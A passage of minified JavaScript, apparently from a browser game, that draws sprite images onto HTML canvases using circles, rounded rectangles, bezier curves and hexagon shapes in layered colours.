                    ke(o, 30 * e, 87.984375 * e, 12.165525060596439 * e),
                    he(o, i[0], i[0], 4 * e),
                    ke(o, 30 * e, 87.484375 * e, 6 * e),
                    he(o, i[0]),
                    ke(o, 100 * e, 30 * e, 20.8806130178211 * e),
                    he(o, i[0], i[0], 4 * e),
                    ke(o, 100 * e, 30 * e, 12.165525060596439 * e),
                    he(o, i[0], i[0], 4 * e),
                    ke(o, 100 * e, 30 * e, 6 * e),
                    he(o, i[0]),
                    ke(o, 100 * e, 130 * e, 20.8806130178211 * e),
                    he(o, i[0], i[0], 4 * e),
                    ke(o, 100 * e, 130 * e, 12.165525060596439 * e),
                    he(o, i[0], i[0], 4 * e),
                    ke(o, 100 * e, 130 * e, 6 * e),
                    he(o, i[0]),
                    o.save(),
                    o.translate(102 * e, 81.984375 * e),
                    o.rotate(0),
                    Ve(o, -74 * e, -57 * e, 148 * e, 114 * e, 23 * e),
                    o.restore(),
                    he(o, i[0], i[0], 4 * e),
                    o.save(),
                    o.translate(101 * e, 64.984375 * e),
                    o.rotate(0),
                    Ve(o, -33 * e, -10 * e, 66 * e, 20 * e, 15 * e),
                    o.restore(),
                    he(o, i[0], i[0], 4 * e),
                    o.save(),
                    o.translate(102 * e, 63.484375 * e),
                    o.rotate(0),
                    Ve(o, -9 * e, -27.5 * e, 18 * e, 55 * e, 15 * e),
                    o.restore(),
                    o.translate(5, -5),
                    o.globalAlpha = 1,
                    ke(o, 174 * e, 87.984375 * e, 20.8806130178211 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 174 * e, 87.984375 * e, 12.165525060596439 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 174 * e, 87.484375 * e, 6 * e),
                    he(o, i[2]),
                    ke(o, 30 * e, 87.984375 * e, 20.8806130178211 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 30 * e, 87.984375 * e, 12.165525060596439 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 30 * e, 87.484375 * e, 6 * e),
                    he(o, i[2]),
                    ke(o, 102 * e, 30 * e, 20.8806130178211 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 102 * e, 30 * e, 12.165525060596439 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 102 * e, 30 * e, 6 * e),
                    he(o, i[1]),
                    ke(o, 102 * e, 130 * e, 20.8806130178211 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 102 * e, 130 * e, 12.165525060596439 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 102 * e, 130 * e, 6 * e),
                    he(o, i[1]),
                    o.save(),
                    o.translate(102 * e, 81.984375 * e),
                    Ve(o, -74 * e, -57 * e, 148 * e, 114 * e, 23 * e),
                    o.restore(),
                    he(o, i[1], i[3], 8 * e),
                    o.save(),
                    o.translate(101 * e, 64.984375 * e),
                    Ve(o, -33 * e, -10 * e, 66 * e, 20 * e, 15 * e),
                    o.restore(),
                    he(o, i[2], i[1], 8 * e),
                    o.save(),
                    o.translate(102 * e, 63.484375 * e),
                    Ve(o, -9 * e, -27.5 * e, 18 * e, 55 * e, 15 * e),
                    o.restore(),
                    he(o, i[2], i[1], 8 * e),
                    ke(o, 135 * e, 107.36605834960938 * e, 21.095023109728988 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 135 * e, 107.36605834960938 * e, 13 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 135 * e, 107.36605834960938 * e, 6.082762530298219 * e),
                    he(o, i[2]),
                    ke(o, 70 * e, 107.36605834960938 * e, 21.095023109728988 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 70 * e, 107.36605834960938 * e, 13 * e),
                    he(o, i[1], i[3], 8 * e),
                    ke(o, 70 * e, 107.36605834960938 * e, 6.082762530298219 * e),
                    he(o, i[2]),
                    r
            }
            function Vi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 95 * e,
                    n.height = 85 * e,
                    0 == i ? (r.translate(7 * e, 15 * e),
                        r.scale(.9, .9),
                        r.save(),
                        Ve(r, 0 * e, 5 * e, 90 * e, 60 * e, 10),
                        he(r, t[0]),
                        r.globalCompositeOperation = "destination-out",
                        ke(r, 25 * e, 40 * e, 10 * e),
                        r.fill(),
                        ke(r, 65 * e, 40 * e, 10 * e),
                        r.fill(),
                        r.restore(),
                        r.save(),
                        Ve(r, 0, 0, 90 * e, 60 * e, 10 * e),
                        he(r, t[1]),
                        r.globalCompositeOperation = "destination-out",
                        ke(r, 25 * e, 40 * e, 10 * e),
                        r.fill(),
                        ke(r, 65 * e, 40 * e, 10 * e),
                        r.fill(),
                        r.restore()) : 1 == i && (r.scale(.8, .8),
                            r.translate(15 * e, 33 * e),
                            r.save(),
                            r.scale(.56, .56),
                            r.translate(-39 * e, -60 * e),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(32.5 * e, 50.642852783203125 * e),
                            r.bezierCurveTo(83 * e, 69.64285278320312 * e, 83 * e, 69.64285278320312 * e, 133.5 * e, 88.64285278320312 * e),
                            r.bezierCurveTo(93 * e, 92.64285278320312 * e, 93 * e, 92.64285278320312 * e, 52.5 * e, 96.64285278320312 * e),
                            r.bezierCurveTo(30.5 * e, 100.64285278320312 * e, 36.5 * e, 94.64285278320312 * e, 32.5 * e, 84.64285278320312 * e),
                            r.bezierCurveTo(21.5 * e, 45.642852783203125 * e, 24.5 * e, 48.642852783203125 * e, 31.5 * e, 50.642852783203125 * e),
                            r.closePath(),
                            he(r, t[1]),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(116.5 * e, 85.64285278320312 * e),
                            r.bezierCurveTo(160.5 * e, 67.14285278320312 * e, 160.5 * e, 67.14285278320312 * e, 204.5 * e, 48.642852783203125 * e),
                            r.bezierCurveTo(220.5 * e, 42.642852783203125 * e, 208.5 * e, 68.64285278320312 * e, 205.5 * e, 85.64285278320312 * e),
                            r.bezierCurveTo(202.5 * e, 98.64285278320312 * e, 199.5 * e, 98.64285278320312 * e, 188.5 * e, 100.64285278320312 * e),
                            r.closePath(),
                            he(r, t[1]),
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(166.5 * e, 68.64285278320312 * e),
                            r.bezierCurveTo(147.5 * e, 72.64285278320312 * e, 145.5 * e, 73.64285278320312 * e, 142.5 * e, 62.642852783203125 * e),
                            r.bezierCurveTo(121.5 * e, 12.642852783203125 * e, 122.5 * e, 5.642852783203125 * e, 117.5 * e, 15.642852783203125 * e),
                            r.bezierCurveTo(105.5 * e, 40.642852783203125 * e, 105.5 * e, 40.642852783203125 * e, 93.5 * e, 65.64285278320312 * e),
                            r.bezierCurveTo(89.5 * e, 74.64285278320312 * e, 84.5 * e, 72.64285278320312 * e, 73.5 * e, 74.64285278320312 * e),
                            r.bezierCurveTo(98 * e, 87.64285278320312 * e, 98 * e, 87.64285278320312 * e, 122.5 * e, 100.64285278320312 * e),
                            r.closePath(),
                            he(r, t[1]),
                            r.restore(),
                            r.save(),
                            Ve(r, 0, 15 * e, 90 * e, 50 * e, 10 * e),
                            he(r, t[0]),
                            Ve(r, 0, 10 * e, 90 * e, 50 * e, 10 * e),
                            he(r, t[1]),
                            r.globalCompositeOperation = "destination-out",
                            ke(r, 25 * e, 40 * e, 10 * e),
                            r.fill(),
                            ke(r, 65 * e, 40 * e, 10 * e),
                            r.fill(),
                            r.restore()),
                    n
            }
            function ki(e, t, i) {
                var n, r = document.createElement("canvas"), o = r.getContext("2d");
                return r.width = 120 * e,
                    r.height = 100 * e,
                    Ve(o, 10 * e, 10 * e, 95 * e, 80 * e, 10 * e),
                    he(o, t[2]),
                    Ve(o, 10 * e, 5 * e, 95 * e, 80 * e, 10 * e),
                    he(o, t[3], t[4], 4 * e),
                    0 == i ? (n = Vi(.75 * e, t, 0),
                        o.drawImage(n, 22 * e, 18 * e)) : 1 == i && (n = Vi(.75 * e, t, 1),
                            o.drawImage(n, 22 * e, 18 * e)),
                    r
            }
            function Ki(e, t, i) {
                var n, r, o, a, s = document.createElement("canvas"), _ = s.getContext("2d"), E = (s.width = 185 * e,
                    s.height = 164 * e,
                    _.translate(0, 0),
                    n = e,
                    E = t,
                    r = i,
                    o = document.createElement("canvas"),
                    a = o.getContext("2d"),
                    o.width = 201 * n,
                    o.height = 164 * n,
                    a.translate(0, 5 * n),
                    a.globalAlpha = E ? .5 : 1,
                    ke(a, 100.5 * n, 82 * n, 74.92746655359852 * n),
                    he(a, r[0], r[0], 4 * n),
                    ke(a, 100.5 * n, 82 * n, 65.9417374971317 * n),
                    he(a, r[0], r[0], 4 * n),
                    a.translate(0, -5),
                    a.globalAlpha = 1,
                    ke(a, 100.5 * n, 82 * n, 74.92746655359852 * n),
                    he(a, r[1], r[3], 4 * n),
                    ke(a, 100.5 * n, 82 * n, 65.9417374971317 * n),
                    he(a, r[1], r[2], 4 * n),
                    ke(a, 100.5 * n, 82 * n, 35.9417374971317 * n),
                    he(a, r[1], r[2], 20 * n),
                    ke(a, 100.5 * n, 82 * n, 15.9417374971317 * n),
                    he(a, r[1], r[2], 6 * n),
                    o);
                return _.drawImage(E, -10 * e, 0 * e),
                    E = Wi(e, t, i, 0),
                    _.drawImage(E, -83 * e, -40 * e),
                    E = Wi(e, t, i, Math.PI / 1.4),
                    _.drawImage(E, -15 * e, -88 * e),
                    E = Wi(e, t, i, Math.PI / -1.4),
                    _.drawImage(E, 15 * e, -8 * e),
                    s
            }
            function Ui(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 450 * e,
                    n.height = 790 * e,
                    r.translate(5 * e, 5 * e),
                    r.globalAlpha = 0,
                    ke(r, 178.5 * e, 172.828125 * e, 150 * e),
                    he(r, void 0, i[0], 65 * e),
                    ke(r, 178.5 * e, 172.828125 * e, 150 * e),
                    he(r, void 0, i[0], 55 * e),
                    r.closePath(),
                    r.save(),
                    r.translate(177 * e, 512.328125 * e),
                    Ve(r, -25 * e, -202.5 * e, 65 * e, 405 * e, 25 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(136 * e, 581.828125 * e),
                    Ve(r, -39 * e, -23 * e, 78 * e, 46 * e, 25 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(135.5 * e, 663.828125 * e),
                    Ve(r, -39.5 * e, -22 * e, 79 * e, 44 * e, 25 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(114 * e, 594.828125 * e),
                    r.bezierCurveTo(175 * e, 596.828125 * e, 163 * e, 596.828125 * e, 172 * e, 594.828125 * e),
                    r.bezierCurveTo(171.5 * e, 633.828125 * e, 171.5 * e, 633.828125 * e, 171 * e, 672.828125 * e),
                    r.bezierCurveTo(110 * e, 673.828125 * e, 140.5 * e, 673.328125 * e, 110 * e, 673.828125 * e),
                    r.bezierCurveTo(110.5 * e, 661.828125 * e, 110.5 * e, 661.828125 * e, 111 * e, 649.828125 * e),
                    r.bezierCurveTo(157 * e, 633.828125 * e, 134 * e, 607.828125 * e, 114 * e, 594.828125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(0, 5 * e),
                    r.moveTo(140 * e, 294.828125 * e),
                    r.bezierCurveTo(212 * e, 295.828125 * e, 176.5 * e, 295.328125 * e, 213 * e, 295.828125 * e),
                    r.bezierCurveTo(201.5 * e, 325.328125 * e, 201.5 * e, 325.328125 * e, 190 * e, 354.828125 * e),
                    r.bezierCurveTo(175.5 * e, 355.828125 * e, 175.5 * e, 355.828125 * e, 161 * e, 356.828125 * e),
                    r.bezierCurveTo(154.5 * e, 328.828125 * e, 154.5 * e, 328.828125 * e, 148 * e, 300.828125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(3, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(159 * e, 679.828125 * e),
                    r.bezierCurveTo(180 * e, 665.828125 * e, 155 * e, 675.828125 * e, 151 * e, 671.828125 * e),
                    r.bezierCurveTo(154.5 * e, 685.328125 * e, 154.5 * e, 685.328125 * e, 158 * e, 698.828125 * e),
                    r.bezierCurveTo(171 * e, 699.828125 * e, 171 * e, 699.828125 * e, 184 * e, 700.828125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157 * e, 548.828125 * e),
                    r.bezierCurveTo(157 * e, 561.828125 * e, 157 * e, 561.828125 * e, 157 * e, 574.828125 * e),
                    r.bezierCurveTo(132.5 * e, 580.828125 * e, 132.5 * e, 580.828125 * e, 108 * e, 586.828125 * e),
                    r.bezierCurveTo(112 * e, 599.828125 * e, 111 * e, 593.828125 * e, 112 * e, 599.828125 * e),
                    r.bezierCurveTo(159 * e, 603.828125 * e, 126.5 * e, 601.328125 * e, 141 * e, 602.828125 * e),
                    r.bezierCurveTo(145 * e, 641.828125 * e, 143.5 * e, 623.828125 * e, 146 * e, 644.828125 * e),
                    r.bezierCurveTo(129.5 * e, 645.328125 * e, 129.5 * e, 645.328125 * e, 113 * e, 645.828125 * e),
                    r.bezierCurveTo(107.5 * e, 652.828125 * e, 107.5 * e, 652.828125 * e, 102 * e, 659.828125 * e),
                    r.bezierCurveTo(104 * e, 669.328125 * e, 104 * e, 669.328125 * e, 106 * e, 678.828125 * e),
                    r.bezierCurveTo(145 * e, 679.328125 * e, 145 * e, 679.328125 * e, 184 * e, 679.828125 * e),
                    r.bezierCurveTo(185 * e, 615.828125 * e, 185 * e, 615.828125 * e, 186 * e, 551.828125 * e),
                    r.bezierCurveTo(172.5 * e, 551.328125 * e, 172.5 * e, 551.328125 * e, 159 * e, 550.828125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 7 * e),
                    r.restore(),
                    r.globalAlpha = 1,
                    r.translate(15 * e, 35 * e),
                    ke(r, 178.5 * e, 172.828125 * e, 150 * e),
                    he(r, void 0, i[2], 95 * e),
                    ke(r, 178.5 * e, 172.828125 * e, 150 * e),
                    he(r, void 0, i[1], 55 * e),
                    r.closePath(),
                    r.save(),
                    r.translate(177 * e, 512.328125 * e),
                    Ve(r, -25 * e, -202.5 * e, 65 * e, 405 * e, 25 * e),
                    r.restore(),
                    he(r, i[1], i[2], 20 * e),
                    r.save(),
                    r.translate(136 * e, 581.828125 * e),
                    Ve(r, -39 * e, -23 * e, 78 * e, 46 * e, 25 * e),
                    r.restore(),
                    he(r, i[1], i[2], 20 * e),
                    r.save(),
                    r.translate(135.5 * e, 663.828125 * e),
                    Ve(r, -39.5 * e, -22 * e, 79 * e, 44 * e, 25 * e),
                    r.restore(),
                    he(r, i[1], i[2], 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(114 * e, 594.828125 * e),
                    r.bezierCurveTo(175 * e, 596.828125 * e, 163 * e, 596.828125 * e, 172 * e, 594.828125 * e),
                    r.bezierCurveTo(171.5 * e, 633.828125 * e, 171.5 * e, 633.828125 * e, 171 * e, 672.828125 * e),
                    r.bezierCurveTo(110 * e, 673.828125 * e, 140.5 * e, 673.328125 * e, 110 * e, 673.828125 * e),
                    r.bezierCurveTo(110.5 * e, 661.828125 * e, 110.5 * e, 661.828125 * e, 111 * e, 649.828125 * e),
                    r.bezierCurveTo(157 * e, 633.828125 * e, 134 * e, 607.828125 * e, 114 * e, 594.828125 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(0, 5 * e),
                    r.moveTo(123 * e, 294.828125 * e),
                    r.bezierCurveTo(212 * e, 295.828125 * e, 190.5 * e, 295.328125 * e, 250 * e, 295.828125 * e),
                    r.bezierCurveTo(231.5 * e, 325.328125 * e, 231.5 * e, 325.328125 * e, 220 * e, 354.828125 * e),
                    r.bezierCurveTo(175.5 * e, 355.828125 * e, 175.5 * e, 355.828125 * e, 140 * e, 356.828125 * e),
                    r.bezierCurveTo(123.5 * e, 328.828125 * e, 123.5 * e, 328.828125 * e, 123 * e, 294.828125 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.translate(0, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(159 * e, 679.828125 * e),
                    r.bezierCurveTo(180 * e, 665.828125 * e, 155 * e, 675.828125 * e, 151 * e, 671.828125 * e),
                    r.bezierCurveTo(154.5 * e, 685.328125 * e, 154.5 * e, 685.328125 * e, 158 * e, 698.828125 * e),
                    r.bezierCurveTo(171 * e, 699.828125 * e, 171 * e, 699.828125 * e, 184 * e, 700.828125 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.save(),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157 * e, 548.828125 * e),
                    r.bezierCurveTo(157 * e, 561.828125 * e, 157 * e, 561.828125 * e, 157 * e, 574.828125 * e),
                    r.bezierCurveTo(132.5 * e, 580.828125 * e, 132.5 * e, 580.828125 * e, 108 * e, 586.828125 * e),
                    r.bezierCurveTo(112 * e, 599.828125 * e, 111 * e, 593.828125 * e, 112 * e, 599.828125 * e),
                    r.bezierCurveTo(159 * e, 603.828125 * e, 126.5 * e, 601.328125 * e, 141 * e, 602.828125 * e),
                    r.bezierCurveTo(145 * e, 641.828125 * e, 143.5 * e, 623.828125 * e, 146 * e, 644.828125 * e),
                    r.bezierCurveTo(129.5 * e, 645.328125 * e, 129.5 * e, 645.328125 * e, 113 * e, 645.828125 * e),
                    r.bezierCurveTo(107.5 * e, 652.828125 * e, 107.5 * e, 652.828125 * e, 102 * e, 659.828125 * e),
                    r.bezierCurveTo(104 * e, 669.328125 * e, 104 * e, 669.328125 * e, 106 * e, 678.828125 * e),
                    r.bezierCurveTo(145 * e, 679.328125 * e, 145 * e, 679.328125 * e, 184 * e, 679.828125 * e),
                    r.bezierCurveTo(185 * e, 615.828125 * e, 185 * e, 615.828125 * e, 186 * e, 551.828125 * e),
                    r.bezierCurveTo(172.5 * e, 551.328125 * e, 172.5 * e, 551.328125 * e, 159 * e, 550.828125 * e),
                    r.closePath(),
                    he(r, i[1], i[1], 7 * e),
                    r.restore(),
                    n
            }
            function Yi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 202 * e,
                    n.height = 202 * e,
                    r.translate(2 * e, +e),
                    r.globalAlpha = .3,
                    ke(r, 98 * e, 99 * e, 100 * e),
                    he(r, i[0]),
                    r.globalAlpha = .5,
                    ke(r, 98 * e, 99 * e, 90 * e),
                    he(r, i[1]),
                    n
            }
            function Fi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 89 * e,
                    n.height = 89 * e,
                    r.save(),
                    r.translate(44.5 * e, 44.5 * e),
                    A(r, 6, 40 * e, 10 * e),
                    r.restore(),
                    he(r, i[0], i[1], 5 * e),
                    r.save(),
                    r.translate(44.5 * e, 44.5 * e),
                    A(r, 6, 25.11521001172521 * e, 10 * e),
                    r.restore(),
                    he(r, i[2], i[3], 5 * e),
                    n
            }
            function xi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 88 * e,
                    n.height = 88 * e,
                    r.save(),
                    r.translate(44 * e, 44 * e),
                    r.rotate(.52),
                    A(r, 6, 43 * e, 10 * e),
                    r.restore(),
                    he(r, i[0], i[1], 3 * e),
                    n
            }
            function Ji(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 202 * e,
                    n.height = 202 * e,
                    r.translate(2 * e, +e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(98 * e, 41.15177917480469 * e),
                    r.rotate(.8),
                    Ve(r, -16 * e, -16.5 * e, 32 * e, 33 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 22.5089111328125 * e),
                    r.bezierCurveTo(97.5 * e, 41.5089111328125 * e, 97.5 * e, 41.5089111328125 * e, 97 * e, 60.5089111328125 * e),
                    he(r, i[2]),
                    r.save(),
                    r.translate(147.5 * e, 69.5089111328125 * e),
                    r.rotate(.2),
                    Ve(r, -15.5 * e, -16 * e, 31 * e, 32 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(163 * e, 59.50892639160156 * e),
                    r.bezierCurveTo(147 * e, 69.50892639160156 * e, 127 * e, 82.50892639160156 * e, 131 * e, 79.50892639160156 * e),
                    he(r, i[2]),
                    r.save(),
                    r.translate(143.5 * e, 128.2946319580078 * e),
                    r.rotate(1.24),
                    Ve(r, -16.5 * e, -17.5 * e, 33 * e, 35 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 135.93748474121094 * e),
                    r.bezierCurveTo(143.5 * e, 128.43748474121094 * e, 129 * e, 120.93748474121094 * e, 125 * e, 120.93748474121094 * e),
                    he(r, i[2]),
                    r.save(),
                    r.translate(99 * e, 156.08035278320312 * e),
                    r.rotate(.84),
                    Ve(r, -18 * e, -18 * e, 36 * e, 36 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 136.08035278320312 * e),
                    r.bezierCurveTo(98 * e, 156.08035278320312 * e, 98 * e, 156.08035278320312 * e, 98 * e, 176.08035278320312 * e),
                    he(r, i[2]),
                    r.save(),
                    r.translate(54 * e, 72.22320556640625 * e),
                    r.rotate(1.32),
                    Ve(r, -18 * e, -19 * e, 36 * e, 38 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(34 * e, 60.79463195800781 * e),
                    r.bezierCurveTo(53.5 * e, 72.29463195800781 * e, 69 * e, 79.79463195800781 * e, 73 * e, 83.79463195800781 * e),
                    he(r, i[2]),
                    r.save(),
                    r.translate(49 * e, 127.29463195800781 * e),
                    r.rotate(1.76),
                    Ve(r, -20 * e, -17.5 * e, 40 * e, 35 * e, 7 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 141.7946319580078 * e),
                    r.bezierCurveTo(47 * e, 130.2946319580078 * e, 64 * e, 119.79463195800781 * e, 64 * e, 118.79463195800781 * e),
                    he(r, i[2]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(98 * e, 41.15177917480469 * e),
                    r.rotate(.8),
                    Ve(r, -16 * e, -16.5 * e, 32 * e, 33 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 22.5089111328125 * e),
                    r.bezierCurveTo(97.5 * e, 41.5089111328125 * e, 97.5 * e, 41.5089111328125 * e, 97 * e, 60.5089111328125 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.save(),
                    r.translate(147.5 * e, 69.5089111328125 * e),
                    r.rotate(.2),
                    Ve(r, -15.5 * e, -16 * e, 31 * e, 32 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(163 * e, 59.50892639160156 * e),
                    r.bezierCurveTo(147 * e, 69.50892639160156 * e, 127 * e, 82.50892639160156 * e, 131 * e, 79.50892639160156 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.save(),
                    r.translate(143.5 * e, 128.2946319580078 * e),
                    r.rotate(1.24),
                    Ve(r, -16.5 * e, -17.5 * e, 33 * e, 35 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 135.93748474121094 * e),
                    r.bezierCurveTo(143.5 * e, 128.43748474121094 * e, 129 * e, 120.93748474121094 * e, 125 * e, 120.93748474121094 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.save(),
                    r.translate(99 * e, 156.08035278320312 * e),
                    r.rotate(.84),
                    Ve(r, -18 * e, -18 * e, 36 * e, 36 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98 * e, 136.08035278320312 * e),
                    r.bezierCurveTo(98 * e, 156.08035278320312 * e, 98 * e, 156.08035278320312 * e, 98 * e, 176.08035278320312 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.save(),
                    r.translate(54 * e, 72.22320556640625 * e),
                    r.rotate(1.32),
                    Ve(r, -18 * e, -19 * e, 36 * e, 38 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(34 * e, 60.79463195800781 * e),
                    r.bezierCurveTo(53.5 * e, 72.29463195800781 * e, 69 * e, 79.79463195800781 * e, 73 * e, 83.79463195800781 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.save(),
                    r.translate(49 * e, 127.29463195800781 * e),
                    r.rotate(1.76),
                    Ve(r, -20 * e, -17.5 * e, 40 * e, 35 * e, 7 * e),
                    r.restore(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 141.7946319580078 * e),
                    r.bezierCurveTo(47 * e, 130.2946319580078 * e, 64 * e, 119.79463195800781 * e, 64 * e, 118.79463195800781 * e),
                    he(r, void 0, i[4], 5 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(98 * e, 99 * e),
                    A(r, 6, 70.28669492273468 * e, 10 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.save(),
                    r.translate(98 * e, 99 * e),
                    A(r, 6, 56.455940020351264 * e, 10 * e),
                    r.restore(),
                    he(r, i[2]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(98 * e, 99 * e),
                    A(r, 6, 70.28669492273468 * e, 10 * e),
                    r.restore(),
                    he(r, i[5], i[6], 5 * e),
                    r.save(),
                    r.translate(98 * e, 99 * e),
                    A(r, 6, 56.455940020351264 * e, 10 * e),
                    r.restore(),
                    he(r, i[7], i[8], 7 * e),
                    n
            }
            function Xi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 161 * e,
                    n.height = 184 * e,
                    r.translate(0, 10 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105.5 * e, 34.609375 * e),
                    r.bezierCurveTo(48.5 * e, 7.609375 * e, 11.5 * e, 58.609375 * e, 20.5 * e, 97.609375 * e),
                    r.bezierCurveTo(44.5 * e, 161.609375 * e, 70.5 * e, 171.609375 * e, 88.5 * e, 156.609375 * e),
                    r.bezierCurveTo(120.5 * e, 129.609375 * e, 123.5 * e, 105.609375 * e, 128.5 * e, 83.609375 * e),
                    r.bezierCurveTo(137.5 * e, 79.609375 * e, 141.5 * e, 79.609375 * e, 146.5 * e, 81.609375 * e),
                    r.bezierCurveTo(153.5 * e, 70.609375 * e, 151.5 * e, 65.609375 * e, 148.5 * e, 61.609375 * e),
                    r.bezierCurveTo(134.5 * e, 60.609375 * e, 131.5 * e, 63.609375 * e, 127.5 * e, 66.609375 * e),
                    r.bezierCurveTo(127.5 * e, 55.609375 * e, 125.5 * e, 54.609375 * e, 120.5 * e, 51.609375 * e),
                    r.bezierCurveTo(128.5 * e, 42.609375 * e, 136.5 * e, 38.609375 * e, 147.5 * e, 39.609375 * e),
                    r.bezierCurveTo(152.5 * e, 23.609375 * e, 147.5 * e, 21.609375 * e, 140.5 * e, 17.609375 * e),
                    r.bezierCurveTo(120.5 * e, 17.609375 * e, 114.5 * e, 27.609375 * e, 106.5 * e, 35.609375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(45.5 * e, 144.609375 * e),
                    r.bezierCurveTo(35.5 * e, 155.609375 * e, 37 * e, 152.109375 * e, 28.5 * e, 159.609375 * e),
                    r.bezierCurveTo(16.5 * e, 154.609375 * e, 16.5 * e, 151.609375 * e, 17.5 * e, 141.609375 * e),
                    r.bezierCurveTo(25.5 * e, 134.109375 * e, 25.5 * e, 134.109375 * e, 33.5 * e, 126.609375 * e),
                    he(r, i[0]),
                    r.translate(0, -10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(45.5 * e, 144.609375 * e),
                    r.bezierCurveTo(35.5 * e, 155.609375 * e, 37 * e, 152.109375 * e, 28.5 * e, 159.609375 * e),
                    r.bezierCurveTo(16.5 * e, 154.609375 * e, 16.5 * e, 151.609375 * e, 17.5 * e, 141.609375 * e),
